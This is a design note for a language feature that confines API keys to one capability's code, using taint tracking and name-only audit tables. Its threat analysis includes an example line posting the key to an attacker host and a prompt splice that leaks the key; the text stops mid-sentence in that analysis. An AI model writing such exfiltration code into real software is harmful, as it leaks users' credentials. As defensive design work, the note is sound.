# 256: capability-bound secrets, a key confined to one capability's emissions

Design note for roadmap item 256 (`docs/v2.0-roadmap.md`, grep `^256\.`).
Design only: no compiler code changes land with this note. The companion is
item 249 (`docs/design/249-taint-provenance.md`), whose taint machinery this
note reuses rather than duplicates, and item 379 (extern typed config), whose
plug-time injection seam this note extends.

## Revision (adversarial review 2026-08-31)

A second adversarial review found two CRITICALs and a HIGH that change the
framing of this note. The value of the feature survives, but the earlier draft
oversold a language-level type guarantee that does not exist for the bound key,
conflated two opposite flow policies onto one origin token, and assumed a
refusal surface the taint machinery does not currently have. This revision
corrects all three and restates the guarantee boundary honestly. The changes:

- **Two disjoint origin tokens, not one (was CRITICAL 1).** The earlier draft
  minted a single `secret` origin for BOTH the bound provider key (must be
  refused everywhere, never declassifiable) AND the `Secret[T]` value qualifier
  (crossable at a declared `Secret[T]` receiver, declassifiable at an audited
  point). Because `_endorse`/`_check_sinks` decide purely from the origin
  string, the permissive `Secret[T]` policy was reachable by the bound key: a
  bound key reflected out of an extern return (origin `secret`) and passed to a
  `service ... fn take(x: Secret[Str])` receiver would have been admitted and
  exfiltrated. The two features now carry **disjoint** origins: `secret` for the
  bound key (total refusal, no declassifier, only same-capability re-emission),
  and a separate `confidential` origin for the `Secret[T]` qualifier
  (admitted only at a declared `Secret[T]` receiver, declassifiable via a
  declared `endorse[confidential]`). No sink and no declassifier accepts both.
  See section 4a and section 7.

- **Mechanism 1 (the no-eliminator `Secret` TYPE) is vacuous for the bound key
  (was CRITICAL 2).** The bound key is injected ONLY as a host-scope local, the
  first line of the emitted `@py` def (`openai_key = _revl_secret(...)`). revl's
  checker never descends into host body text: `typecheck.py` has zero references
  to `HostBody`/`.text`, and the parser stores an extern body as opaque
  `HostBody(backend, text, line)` host text (`@backend { ... }`). So there is NO
  revl-typed `Secret` binding anywhere for the bound key, and the earlier claim
  that a no-eliminator type "stops the interpolation from type-checking" was
  false: `prompt = f"sys {openai_key}"` inside a `@py` body is a Python f-string,
  never a revl `Interp`, and it puts the key straight into the model context, the
  exact headline the feature promised to prevent. This revision removes the
  no-eliminator TYPE as the bound-key mechanism entirely. The bound-key guarantee
  now rests on mechanism 2 (secret-origin taint) plus confinement / the boundary
  policy plus G8, stated honestly. The no-eliminator language construct is kept
  only where a revl-typed binding actually exists: the `Secret[T]` value-world
  feature of section 7.

- **"Refused at every sink" needs new secret-specific raising at every crossing
  kind (was HIGH).** Refusals raise only in `_on_sink`, reached from
  `_check_sinks` only for DECLARED sinks (`model.sinks` / `sig.reaches_sink`).
  The `emit` arm (`taint.py:944`) only RECORDS outbound origins into
  `self.reaches`; it does not raise. A plain extern call that is neither a
  declared sink nor an emit only propagates taint. So "refused at every extern
  call / emit / method arg" is not what the machinery does today, it is new work.
  Section 4a.2 now enumerates EVERY crossing kind and specifies the secret raise
  at each, with one test per kind, and states that this is the same
  reach-completeness invariant as item 414: the secret-raise surface must be a
  registered row in `tests/test_reach_completeness.py`.

### The corrected guarantee boundary, up front

**What CANNOT happen, by construction (provable over the revl value graph and
the emit-time injection set):**

1. No revl construct and no declared boundary crossing carries a `secret`-origin
   value out. Once a value carries the `secret` origin (minted at a bound
   emission's return), it is refused at every crossing kind enumerated in 4a.2,
   with no declassifier and no allowed sink except a re-entry into an extern body
   of the same bound capability.
2. A `Secret[T]` value (origin `confidential`) cannot reach a non-`Secret[T]`
   sink: a log, an ordinary serialization, a model prompt, a tool return, an
   un-approved realm crossing, or any capability crossing whose receiver does not
   declare it accepts a secret. It crosses only where the receiving side declares
   a `Secret[T]` parameter, and it downgrades only at a declared, audited
   `endorse[confidential]`.
3. The `secret` and `confidential` origins are disjoint. No sink admits a
   `secret` value; the same-capability re-emission is the only crossing that does
   not refuse it. No declassifier clears `secret`. A `confidential` value is
   never admitted by the bound-key rule, and a `secret` value is never admitted
   by the `Secret[T]` receiver rule.

**What is NOT covered (rests on G8 host-body trust, not prevented by
construction):** a host body that splices the injected key into its own outbound
request. The injected key is host-scope host code from the moment it is bound; if
a `@py` body writes `f"sys {openai_key}"` into the provider request, or opens its
own socket and posts the key, revl does not see inside the body (G8 host-body
opacity). This is A3-class residual, narrowed by confinement and the boundary
policy but not removed. The feature's honest claim is "no revl construct and no
declared crossing carries the secret out", never "the process cannot send the
key".

The rest of this note is the corrected design. Sections 1, 3, 5, 6, 7 carry the
declaration surface, the runtime injection seam, the audit table, the
G-invariant interaction, and the `Secret[T]` value feature. Section 2 is
rewritten to state the honest type-system story (there is no bound-key type).
Section 4 is rewritten for the two disjoint origins and the enumerated raise.

## The claim, and the honest shape of it

The provider key is the one value in an agent system that must reach exactly one
place (the provider's own extern body) and nowhere else, yet today it enters that
body as an ordinary `Str` read from config. One interpolation, one log line, one
stray `return`, and it is in the model context or the transcript. The value never
needed to be readable outside that one body: the only operation anyone ever
performs on an API key is hand it to the one host call that authenticates with it.

So make it exactly that: a binding the runtime injects into the bound
capability's extern bodies and nowhere else, of an origin the flow analysis
refuses at every crossing. The guarantee is a FLOW guarantee, not a type
guarantee, because the bound key lives in host code that revl does not type:

1. **Bound injection (G-side).** A secret is configured against a capability. The
   runtime binds it only inside the extern bodies of that capability's emissions,
   as a host-scope local. This bounds where the key can be *injected*. It does
   NOT, by itself, stop the host body from reading it: host code is host code.

2. **Secret-origin taint (249-side).** If a host body reflects the key back into
   the value world (copies it into its return), that return carries the `secret`
   origin, and the `secret` origin is refused at every boundary crossing with no
   declassifier. This is the real by-construction guarantee: the key cannot
   travel one hop in the *revl value graph*.

The two together give the honest claim: an API key that no revl-level construct
and no declared boundary crossing can carry into the model context, the
transcript, or any other emission. The boundary of that claim, stated in the
Revision block above and again in section 6a, is the whole point: revl reasons
about a host body only through its declared surface (G8 host-body opacity). A host
body that splices the key into its own outbound provider request is outside
revl's reasoning, exactly as any extern that reaches the host is. What this
feature makes *provable* is that no revl construct and no declared crossing
carries the key out. What it rests on is host-body trust, named honestly and
narrowed to the smallest possible surface by confinement.

Folded in from external proposal #9: `Secret[T]`, an information-flow type for a
value that must exist in the value world (a payment token the code passes between
two of its own emissions) but must stay out of specific sinks. Section 7 covers
it. It complements the bound key without sharing its origin: the bound key is a
value the language never holds as a typed binding at all (it lives in host code);
`Secret[T]` is a value the language reads, computes with, and fences at disclosure
sinks. They carry disjoint origins (`secret` versus `confidential`) precisely so
neither's policy can be reached by the other's value.

## 1. The declaration surface

### 1a. The bound secret

A secret is declared at the top level of a document, against a capability token:

```revl
secret openai_key for model.complete
secret stripe_key for payment.charge
```

Grammar (added to the top-level declaration alternatives in `parser.py`,
alongside `extern`, `service`, `component`):

```
secret-decl  = "secret" IDENT "for" capability-token
capability-token = IDENT ("." IDENT)*        // the same token grammar
                                             // emission[...] scopes already use
```

`secret` is a **contextual keyword**, recognised only in the top-level
declaration slot, so no program that used `secret` as an ordinary identifier
breaks (the same discipline `witnessed` and `deferred` use in
`parser.py:extern_decl`). The parser produces a `SecretDecl(name, capability,
line)` node collected into `program.secrets`.

The capability token names an existing capability, the one an `emission[...]`
extern or service operation scopes (`parser.py:_capability_list`, item 343). The
binding is *capability-keyed*, not extern-keyed, deliberately: a capability may
be served by several externs across tiers, and the secret must reach every
emission of that capability and only those. This is the same token the G8 audit
and the boundary policy already use, so a `capability model.complete requires
approval` rule and a secret bound to `model.complete` name the same thing.

### 1b. Where the value comes from (host config, never the manifest)

The **name** is in the source and the manifest. The **value** is not, ever. The
value is supplied at run time exactly where item 379's typed extern config is
supplied: the host driver's config seam (`revl run --config FILE`, resolved by
`run.py:_resolve_extern_config`, installed into the emitted module). This is the
correct layer: the manifest is the enumerable, publishable authority surface, and
it must carry the secret's *name* (so `what could this leak` is answerable from
the manifest alone) and must never carry its *value*.

Concretely, the secret value is sourced by the driver from an environment
variable or a secret store keyed by the secret name, then installed into a new
module-global `_REVL_SECRETS` map (a sibling of item 379's
`_REVL_EXTERN_CONFIG`). The driver resolves it once at plug and never logs it.
Unlike config, a secret's resolved value is never echoed by `--plan`, never
serialized into any trace, and the fail-loud helper (section 3) names the secret
but never its value.

The split from config is a hard rule, not a convention: a config field is *data*
the audit may show (`check_config_field_is_data`), a secret is a value the audit
must never show. They ride different maps for exactly this reason.

## 2. The type-system story: there is no bound-key type (corrected)

The earlier draft claimed the bound key had a builtin nominal type `Secret` with
no eliminators, seeded into the extern body's type environment, so that reading,
interpolating, comparing, or returning it would be refused by the checker. **That
mechanism does not exist and cannot exist for the bound key**, and this section
now states why, honestly.

### 2a. The bound key is a host-scope local, unseen by the checker

The bound key is injected as the first line of the emitted extern `def`, a
host-scope local (`openai_key = _revl_secret("openai_key")`; section 3). The
extern body is host text: the parser stores it as an opaque
`HostBody(backend, text, line)` node (`parser.py`, the `@backend { ... }` form),
and revl's type checker never descends into that text. `typecheck.py` has **zero**
references to `HostBody` or `.text`; it types the extern's declared signature
(params, return, capability scope) and nothing inside the body. So there is no
point at which `openai_key` is a revl binding of any type. It is a Python (or ts,
go, java, rs) local in host code from the moment it is bound.

The consequence is blunt and must be stated plainly: **mechanism 1 provides no
language-level refusal for the bound key.** Inside a `@py` body,
`prompt = f"sys {openai_key}"` is a Python f-string, not a revl `Interp`; it type
-checks (revl never looks at it) and it puts the key into the prompt. `return
openai_key` is a Python return of a host string. Nothing in the *type system*
stops either. There is no "no-eliminator type" standing between the key and the
model context, because there is no revl-typed binding for the type system to
constrain.

### 2b. What actually confines the bound key

Two things, neither of them a bound-key type:

- **Injection scope (section 3):** the key is bound only inside extern bodies
  whose declared capability matches the secret's `for` token, and nowhere else.
  A component method body, a service method body, a plain fn, and every extern of
  a different capability get no `_revl_secret` call emitted into them, so the name
  resolves nowhere else. This is enforced at emit by construction (the injection
  is a property of the extern-emitter loop, gated on capability match).

- **Secret-origin taint (section 4):** the *return* of a bound emission carries
  the `secret` origin, and that origin is refused at every crossing kind in the
  revl value graph, with no declassifier. This catches the case where the host
  body reflects the key into a value revl can see (its return). It does NOT catch
  the case where the host body splices the key into its own outbound request
  without ever returning it across a revl boundary: that is the section-6a G8
  residual, not prevented by construction.

The model-context case, stated honestly: the injected key can reach the model
context iff a host body splices it into the outbound provider request (or any
other host-side reflection into an emission's payload). That is A3-class G8
host-body trust. It is not prevented by construction, and no part of this design
claims it is. What is prevented by construction is the key travelling out through
any *revl* construct or *declared* crossing (section 4).

### 2c. The only real "Secret" language construct is the section-7 qualifier

There IS a language-level no-refusal-by-eliminator story, but it lives in section
7, where revl actually holds a typed binding: the `Secret[T]` qualifier on a
value in the value world. That value is readable and computable by design (it is
a payment token the agent's own code threads between emissions); it is fenced not
by an absent eliminator but by the taint flow analysis refusing it at disclosure
sinks (the `confidential` origin, section 7b). Do not confuse the two: the bound
key has no typed binding and no eliminator story at all; the `Secret[T]` value has
a typed binding and a *flow* fence, not an eliminator fence.

## 3. The runtime-injection mechanism

The seam already exists for config (item 379,
`docs/design/378-sync-extern-service-reach.md` Stage 5). Secrets reuse it,
narrowed.

**Emit side.** For each emission extern whose capability has a bound secret, the
emitter binds the secret as a body-scope local, exactly as it binds
`_revl_config`:

```python
def _openai_complete_apply(prompt):
    openai_key = _revl_secret("openai_key")   # injected, first local
    _revl_config = _revl_extern_config(...)    # item 379, if also a config extern
    # ... verbatim @py body, which may pass openai_key to a host call ...
```

The `_revl_secret(name)` helper reads the module-global `_REVL_SECRETS` map and
is **fail-loud** (mirrors `_revl_extern_config`): if the secret was never
installed, it raises at the extern call, naming the secret, never guessing a
default and never returning `None`. There is no defaults path for a secret. The
helper is emitted only when some emission extern has a bound secret, so a
secret-free program is byte-identical.

**Bind side.** The driver resolves each secret's value once at plug (`run.py`, a
`_resolve_secrets(ir, secret_source)` sibling of `_resolve_extern_config`),
sourcing from the environment or a secret store keyed by the secret name, and
installs `module._REVL_SECRETS.update(...)`. The value is fixed at plug and lives
only in the module global.

**The "nowhere else" property, mechanically.** The binding is emitted *only*
inside the `def` of an emission extern whose declared capability matches the
secret's `for` token. It is never a module global visible to component bodies,
never a parameter, never a config field. A component method body has no
`_revl_secret` call emitted into it, so there is no place in generated
component/service code where the name resolves. This is enforced at emit by
construction: the injection is a property of the extern-emitter loop
(`backends/python/emit.py` extern region), gated on capability match, and nothing
else calls `_revl_secret`. Note the scope of this property: it bounds where the
key is *injected*, not what a host body does with it once injected (section 2b).

**Adapter and `carrying` interaction (item 296).** The injection set is a pure
function of `(program.secrets, all externs' declared emission capabilities)`,
computed at emit over the whole composition. It keys on the DECLARED emission
capability token, resolved at emit, never on a runtime label, so it is not
spoofable by anything a body does at run time. An adapter synthesised by item 296
(or a hand-written `carrying(...)` wrapper) provides a fresh alias and wraps each
method, and its token comparison is by declared classification alone
(`adapt.py`, `_effect_class_ok`). A re-serve is in the secret's injection set iff
the wrapped body still *declares* the bound emission capability: an attenuation
that drops the capability drops out of the injection set (the key is never
injected into it), and an alias that preserves the capability keeps it (the same
semantics as delegation, A6). The wrapper `def` itself, which delegates rather
than declaring the emission, receives no injection; only the underlying bound
emission body does. So no adapter or alias can pull the key into a body that does
not declare the capability, and every body that does declare it is on the G8
surface and drift-visible.

**Cross-tier.** The injection tiers are exactly item 378's
`_CONFIG_INJECTION_TIERS` = {py, ts, go, java, rs}: each emits the module-global
secrets map and a fail-loud lookup mirroring the py shape. wasm stays out (raw WAT
body, no plug-time dict), so a secret bound to a capability whose only body is
`@wasm` is refused at compile with an honest message, exactly as a config extern
on wasm is (`lower.py:_lower_externs`).

## 4. Taint integration (item 249): the flow half, the real guarantee

Section 3 injects the key only into the bound body. It cannot see what the host
body does with it. Item 249's taint model is where the by-construction guarantee
actually lives: the *return* of a bound emission carries the `secret` origin, and
that origin is refused at every crossing kind in the revl value graph.
`taint.py` line 66 already reserves the hook: `secret` is in `_ORIGIN_CLASSES`
but *deliberately excluded* from `_SOURCE_CLASS_SCOPES`, with the comment
"arrives with item 256's own bound-emission rule, not the generic strict
derivation." This note is that rule. This revision adds a second origin,
`confidential`, for the section-7 `Secret[T]` qualifier, disjoint from `secret`.

### 4a. Secret-origin taint: two disjoint origins, refused per policy

The design mints TWO origins, and they are disjoint. No sink and no declassifier
admits both, and this disjointness is the fix for the earlier draft's CRITICAL 1
(one token serving two opposite policies):

- **`secret`** is the bound provider key. Minted at a bound emission's return.
  Refused at every crossing kind (4a.2). Never declassifiable. The only crossing
  that does not refuse it is a re-entry into an extern body of the same bound
  capability (4b).

- **`confidential`** is the section-7 `Secret[T]` value qualifier. Minted where a
  `Secret[T]` value enters the value world. Refused at the disclosure sink set
  (7b) but ADMITTED at a declared `Secret[T]` receiver. Declassifiable at a
  declared `endorse[confidential]` (7c).

Both are added to `_ORIGIN_CLASSES` (`confidential` is the new one; `secret` is
already there). The two policies are wired to the origin string, so keeping them
on disjoint strings is what keeps the permissive `Secret[T]` receiver rule
unreachable by the bound key and the total-refusal bound-key rule unreachable by
a `Secret[T]` value.

#### 4a.1. `secret` is minted at the bound emission's return, always

In `taint.py:extract_and_normalize`, an emission extern whose capability carries
a bound secret has its return recorded in `model.sources[ext.name] = "secret"`
unconditionally (not gated on `taint_strict`, unlike the generic derived
sources). Rationale: a bound key is a security-critical origin whose whole purpose
is to be contained, so its containment is not opt-in. This engages the taint
surface (`TaintModel.active`) for any program that binds a secret, and only such
programs, so a secret-free program stays byte-identical.

#### 4a.2. The `secret` raise at every crossing kind (the HIGH fix)

Refusals raise only in `_on_sink`, reached from `_check_sinks` only for DECLARED
sinks (`model.sinks` / `sig.reaches_sink`). The `emit` arm (`taint.py:944`) only
RECORDS outbound origins into `self.reaches`; it does not raise. A plain extern
call that is neither a declared sink nor an emit only propagates taint (the
ordinary opaque-call path, `_taint_of_call`). So "refused at every crossing" is
NOT what the machinery does today for ordinary origins, and this design does NOT
rely on the declared-sink gate. It adds a `secret`-specific raise at every
crossing kind. Each is a distinct code path and gets its own test:

1. **The `emit` arm** (`taint.py:944`, the `step == "emit"` branch of `_stmt`).
   Today it computes `outbound` (the emission return joined with the carried
   args) and records `self.reaches |= real`. Add: if `real` contains `secret`
   and the enclosing emission's capability is not the secret's bound capability,
   raise G-SECRET here rather than merely recording. This is the model-prompt
   and outbound-send crossing.

2. **The plain (non-declared-sink) extern call** (the ordinary opaque-call path
   in `_taint_of_call`, after the `model.sinks` / `model.sources` /
   declassifier checks, where the result is joined and returned without any
   raise). Add: before propagating, if any argument carries `secret`, raise
   G-SECRET. An ordinary extern that is neither a declared `Trusted[T]` sink nor
   an `emit` still must not receive a `secret` value.

3. **The unnameable indirect / `*` callable** (the `indirect and self.any_sink
   and self._is_unnameable(resolved)` path in `_taint_of_call`, which already
   over-approximates every argument as a sink via `_on_sink`). Extend the
   over-approximation to fire for a `secret`-carrying argument independently of
   `any_sink`: a first-class emitting callable revl cannot name must refuse a
   `secret` argument, because what cannot be named cannot be proven to re-emit
   through the bound capability.

4. **The `provide`-method return across the service / MCP bridge.** A provide
   method that returns a `secret`-carrying value hands it across the service /
   MCP boundary. This is not an `emit` step and not an extern call; it is the
   method return folded by `_walk_component_methods`. Add: a return whose taint
   carries `secret` (real origin, not a marker) raises G-SECRET at the method
   return, unless the method's own operation is the bound capability's
   same-capability re-emission (4b).

5. **A resource/secret nested in a record / variant / generic.** The `secret`
   origin rides the value-graph joins (`_join`, the record/field paths,
   `_union_children`), so a `secret` value nested inside a record field, a
   variant payload, or a generic container reaches a crossing as part of the
   container's origin union. The raise at each crossing above reads the joined
   origin set, so a nested `secret` is caught at the crossing the container
   reaches. The test asserts the nesting does not launder it: a record
   `{k: <secret>}` emitted, an extern call taking `List[<secret-bearing>]`, and a
   generic `id(<secret>)` round-trip are each refused.

#### 4a.3. `secret` has no declassifier

`endorse[secret]` is refused unconditionally: `_endorse` rejects `origin ==
"secret"` before the declared-slot check, so no declaration can grant it, and a
`verified fn` returning `Trusted[T]` does not launder it (the
parser-declassifier path in `_taint_of_call` skips the clean for a
`secret`-carrying argument). There is no "I know what I am doing" edge for a
provider key, by design. Contrast the `confidential` origin (section 7c), which
DOES have a declared, audited `endorse[confidential]` downgrade. `_endorse`
rejects `secret` unconditionally but may accept a declared `confidential`; this
is exactly why the two origins must be disjoint.

#### 4a.4. Reach-completeness: a registered row in the 414 harness

The five crossing kinds in 4a.2 are the same enumeration item 414
(`tests/test_reach_completeness.py`, `feat/414-reach-completeness`) builds for
every authority-derivation surface: the review's recurring bug shape is a fold
that visits one crossing kind and misses another. The `secret`-raise surface must
be a registered row in that harness, asserting the raise fires at ALL of: the
`emit` arm, the plain extern call, the unnameable indirect / `*` callable, the
provide-method return across the service/MCP bridge, and a `secret` nested in a
record/variant/generic. A future new crossing kind must add the `secret` raise to
this row, a checklist the type system cannot forget. Do not implement the
bound-key story against the declared-sink gate alone; the gate governs ordinary
origins and misses exactly the crossings 4a.2 enumerates.

Named functions reused, not reinvented: `TaintModel.sources`,
`extract_and_normalize`, `_origin_of`, `_FlowChecker._on_sink`,
`_FlowChecker._check_sinks`, `_FlowChecker._endorse`,
`_FlowChecker._taint_of_call`, the `emit` arm of `_FlowChecker._stmt`,
`check_taint`, and the audit fold onto `comp["taint"]`. The secret rule is a set
of `origin == "secret"` special-cases inside these plus the new raises at 4a.2's
crossings, not a parallel analysis.

### 4b. The one allowed sink, precisely

The bound emission body may pass the key to its own host call: that is the whole
feature, and in the common case the key never enters the value world at all (it
is a host-scope local handed straight to the provider SDK call, so the taint
walk never sees it). The one allowed *revl* crossing is narrow and mostly
theoretical: if a host body reflects the key into a revl value and re-emits
through the *same* bound capability, that single crossing does not refuse, so a
body that legitimately threads the key through a same-capability retry is not
refused. Every crossing to a *different* capability, or to any other sink kind,
refuses (4a.2). "Same capability" is the declared emission capability token,
resolved at emit, not a runtime label.

### 4c. Why the flow half is the guarantee (corrected)

The earlier draft claimed each of two mechanisms closed the other's gap, and that
"mechanism 1's no-eliminator type is what stops the interpolation from ever
type-checking." **That claim is deleted.** It was false: the bound key has no
revl-typed binding, so there is no type-checking step for an interpolation inside
a `@py` body to fail (section 2a). The corrected picture is simpler and honest:

- The by-construction guarantee for the bound key is the FLOW half alone: a value
  carrying `secret` cannot cross any revl boundary (4a.2), with no declassifier
  (4a.3). This is provable over the revl value graph.

- The injection scope (section 3) bounds where the key is placed, not what host
  code does with it. It is not a language refusal.

- The residual, NOT covered by construction, is a host body that reads the
  injected local and splices it into its own outbound request (an interpolation
  in host code, or a raw socket send). That is the section-6a G8 host-body trust
  boundary, narrowed by confinement and the boundary policy but not removed. The
  key can reach the model context iff such a splice happens; no static rule in
  this design prevents it, and the doc must never say it does.

## 5. The audit secrets table (name only)

`audit_report` (`audit_diff.py:33`) gains a `secrets` entry, following the
existing additive shape (`**({...} if ...)`), absent when the program binds no
secret:

```python
"secrets": _secrets_table(ir),   # [] when no secret is bound
```

where each row is name and capability only, never a value (there is no value in
the IR to leak; the value lives only in the driver's `_REVL_SECRETS` at run
time):

```json
"secrets": [
  { "name": "openai_key", "capability": "model.complete" },
  { "name": "stripe_key", "capability": "payment.charge" }
]
```

The drift gate (`audit_diff.py:crossings`) gains a crossing token
`secret:<capability>:<name>`, so binding a new secret, or rebinding a secret to a
*wider* capability, appears as a widening the `revl audit --diff` gate flags,
exactly as a new emission or a new declassification does. Removing a secret
binding is a narrowing (safe).

Example table for the lighthouse workload's provider keys: two rows,
`openai_key -> model.complete` and (if present) an embeddings key, so "what could
this composition leak, and to which capability is each key confined" is an
enumerable answer read straight off `revl audit --json`, with no value anywhere in
the answer.

### 5a. The audit-table leak surface, stated

The table shows names and capabilities. It shows *no* value, *no* length, *no*
hash, *no* timing. A row is present iff a binding exists, so the only bit it
reveals is "a secret named X is bound to capability Y", which is exactly the
authority fact the manifest is *supposed* to publish. This is a name-only table
(A5); its one residual is the author-controlled name (A5 in section 8).

## 6. G-invariant interaction, especially G8 host-body opacity

The relevant invariants (`docs/rejections.md`):

- **G8 (the boundary surface is enumerable).** A secret binding *is* a boundary
  fact and it lands on the G8 surface: the audit's `secrets` table and the
  `secret:` crossing token. The manifest carries the name, so the enumerable
  authority surface now answers "which keys, to which capabilities" as well as
  "which emissions, which reaches". G8 is strengthened on the *enumeration* axis.
  It is NOT strengthened on the *containment* axis: what a host body does with the
  key it holds is opaque to revl, which is the honest limit below.

- **G4 (every mutation carries an inverse or admits irreversibility via `emit`).**
  Unchanged. A secret does not add a mutation. It rides existing emission
  crossings.

- **G1 (declared access).** A component reaches a bound secret's capability
  through the ordinary required-key mechanism; the secret adds nothing to what the
  component may name. The secret is injected below the component boundary, inside
  the extern body, so a component never names it and G1 is untouched.

### 6a. G8 host-body opacity: the honest boundary

G8's model is that a host body is **opaque**: revl reasons about it only through
its declared classification, capability scope, and reach. The extern body is a
black box that revl trusts to do what its declaration says. A secret is injected
*into* that black box, and, unlike an ordinary value, revl never had a typed
binding for it in the first place (section 2a). So the honest questions:

**Does opacity still hold?** Yes, and that is exactly the limit. revl guarantees
what crosses *into* the body (the key, only into the bound capability's bodies)
and refuses any `secret`-origin value the body reflects back out across a revl
boundary (section 4). revl does *not* see inside the body, and does not type the
injected local.

**A malicious or careless extern body.** A host body for `model.complete` could
contain, in raw Python, `prompt = f"sys {openai_key}"` (splicing the key into the
model context) or `requests.post(attacker, data=openai_key)` (posting it out).
Nothing in this design stops either. That code is host code reaching the host,
which is the thing G8 exists to *declare* (the extern is classified
`emission[model.complete]`) but not to *contain*. The mitigation is not in this
feature; it is in the existing confinement story: the extern's capability scope
and the item-33 boundary policy decide what host reaches are admissible, so a
`model.complete` extern that also opens a socket to an unrelated host is a reach
the boundary policy can forbid. But an extern smuggling the key inside the very
request to its declared provider is indistinguishable from correct behaviour and
no static system catches it. This feature narrows the trust to "the bound body may
see the key" and leans on confinement for "the bound body may only reach what its
capability allows". Neither alone is the whole answer.

**So the guarantee, stated exactly.** For every *revl-level* construct and every
*declared boundary crossing*, the key cannot appear in the model context, the
transcript, or any other emission: any host-level reflection of the key into a
value revl can see is refused at the first crossing (section 4), with no
declassifier. What remains, and is NOT covered, is a host body that itself
splices the key into its own outbound request or performs an undeclared reach with
the key in hand. That residue is the standard G8 host-body trust boundary, neither
larger nor smaller than it is for any other extern, and it is the reason the claim
is "by construction across the revl surface", not "the key is physically incapable
of leaving the process".

## 7. `Secret[T]` information-flow (external proposal #9, folded)

The bound key is a value the language never holds as a typed binding. `Secret[T]`
is the complement: a value the language *does* read and compute with, but that the
checker keeps out of specific sinks. The motivating case is a payment token the
agent's own code receives from one emission and must pass to another, so it must
be a real, projectable value, yet it must never reach a log, an ordinary JSON
serialization, a model prompt, an MCP tool return, an un-approved realm crossing,
or any capability-boundary crossing that does not explicitly declare it.

`Secret[T]` carries a DISTINCT origin from the bound key: `confidential`, not
`secret`. This is the CRITICAL 1 fix. The two never share a token, so the
permissive `Secret[T]` receiver rule (a `confidential` value crosses at a declared
`Secret[T]` receiver) is unreachable by a `secret`-origin bound key, and the
total-refusal bound-key rule is unreachable by a `confidential` value.

### 7a. It is a 249 qualifier, not a new type discipline

`Secret[T]` is modeled exactly as `Untrusted[T]`/`Trusted[T]` are (item 249, "open
question 2 resolved to qualifier"): an orthogonal qualifier on a base type,
stripped into `taint.py`'s side-table by `extract_and_normalize`, so base typing,
method lookup, and emitted IR are byte-identical for any program that uses no
qualifier. `strip_qualifiers`/`top_qualifier`/`_has_qualifier` gain `Secret` as a
third qualifier head alongside `Untrusted`/`Trusted`, and a `Secret[T]` slot mints
the `confidential` origin (not `secret`). A `Secret[PaymentToken]` is a
`PaymentToken` to the base checker and a `confidential`-tainted value to the flow
walk.

The difference from `Untrusted[T]`: `Untrusted` tracks *provenance* (where a value
came from) and is refused only at authority sinks. `Secret[T]` tracks
*confidentiality* (where a value may go) and is refused at *disclosure* sinks:
logs, serialization, prompts, tool returns, and unauthorized boundary crossings.
It reuses the same lattice, the same monotone set-union propagation (`_join`,
`no-false-clean`), the same signature fixed point (`_infer_signatures`), the same
`_check_sinks`/`_on_sink` refusal, differing only in the *sink set* it is refused
at and the *origin* it carries.

### 7b. The disclosure sink set

A new derived sink class, disjoint from 249's authority sinks
(`_SINK_CLASS_SCOPES`). A `confidential`-tainted value reaching any of these is
refused (a new code, G-SECRET-FLOW):

- **log / print / trace**: the diagnostic-emission family;
- **ordinary JSON serialization**: the `to_json`/serialize path (a `Secret[T]`
  field forces a redaction or an explicit declassification);
- **an LLM prompt**: an argument to a `model.*` emission;
- **an MCP tool return**: the value a `provide` method returns across the MCP
  bridge;
- **an un-approved realm crossing**: a spawn/realm boundary without an approval
  edge;
- **any capability-boundary crossing without explicit declaration**: an `emit`
  whose target capability has not declared it accepts `Secret[T]`.

The last is the general rule and the others are named instances of it: a
`Secret[T]` may cross a boundary only where the *receiving* side declares it
accepts a secret (a `Secret[T]` parameter on the service operation, the dual of
249's `Trusted[T]` sink). Everywhere else it is refused. Note that a `secret`
-origin bound-key value is NEVER admitted here: `_check_sinks` admits a
`confidential` value at a declared `Secret[T]` receiver but never a `secret`
value, so a bound key reflected out of an extern cannot ride the `Secret[T]`
receiver rule to a sink.

### 7c. Declassification for `Secret[T]`

Unlike the bound key (never declassifiable), a `confidential` value *may* be
declassified at a declared, audited point, because a payment token legitimately
becomes a non-secret receipt id after a charge settles. The declassifier is the
249 `endorse` surface with a `confidential` origin: `endorse[confidential](token,
reason = "...")` at a declaration that declares the slot, recorded on the audit
surface as a `declassify:confidential` token so the drift gate sees it. `_endorse`
may accept a declared `endorse[confidential]` (subject to the declared-slot check
it already applies to every origin), and rejects `endorse[secret]` unconditionally
(4a.3). This is the sharp line between the two features: the bound key has no
downgrade, the typed `Secret[T]` value has an audited one, and they carry disjoint
origins so no declassifier can confuse them.

## 8. Adversarial self-review

The second review's two CRITICALs and the HIGH are folded into the design above
(the Revision block, sections 2, 4, 7). This section keeps the standing attack
catalogue, updated for the corrected framing. A3 remains OPEN and is the honest
limit; the bound-key attacks A1/A4 are re-analysed against the flow-only
guarantee (there is no bound-key type to lean on).

### A1. A host body copies the key into its return value

**Attack.** `extern emission[model.complete] fn complete(p) = @py { return
openai_key_as_str }` (the body reflects the injected key into a returned `Str`).
**Mitigation (holds, flow-only).** The return of a bound emission is minted
`secret`-origin (4a.1). That returned value is refused at the first crossing it
reaches (4a.2, whichever kind that is), with no declassifier (4a.3). So the key
cannot travel past the first revl crossing in the value world. **Provable vs
trusted.** The taint refusal is provable over the revl value graph. What it does
not stop is the host body posting or splicing the key from *inside* itself (A3).
Within the revl surface, closed.

### A2. `Secret[T]` laundered through a generic

**Attack.** `fn id[T](x: T) -> T { return x }` called as `id(secret_token)`: does
the `confidential` qualifier survive the generic round-trip, or does `T` erase it
to a clean `PaymentToken`? **Mitigation (holds, and is exactly why 249's design
was chosen).** The qualifier is stripped into the side-table and the flow walk
tracks the *value*, not its declared type, through `_infer_signatures`: `id`'s
inferred signature has `flows_to_return = {0}`, so the call site propagates
argument 0's `confidential` taint to the result regardless of the erased generic
type. The generic launders nothing because taint rides the value, not the type
name. The same holds for a `secret`-origin value nested in a generic (4a.2 kind
5). **Provable.** This is the `no-false-clean` invariant (taint disappears only at
a literal or a declassifier), and a generic is neither.

### A3. A host body performs an undeclared reach with the key (CRITICAL, OPEN)

**Attack.** The `model.complete` body contains raw `socket`/`requests` code that
sends `openai_key` to an attacker, or splices it into the provider request, never
crossing a revl boundary at all. **Status: OPEN, and it is the honest limit of the
whole feature.** No part of this design inspects host-body internals (G8
host-body opacity, section 6a), and, for the bound key, revl never even had a
typed binding to constrain (section 2a). This is not a *regression* (the same body
could exfiltrate any config value today, and any emission body can already reach
the host), but it is the CRITICAL the feature must not oversell: the guarantee is
"no revl construct and no declared crossing carries the key out", not "the process
cannot send the key". **Partial mitigation, not a fix.** The extern is scoped
`emission[model.complete]`, and the item-33 boundary policy can forbid a
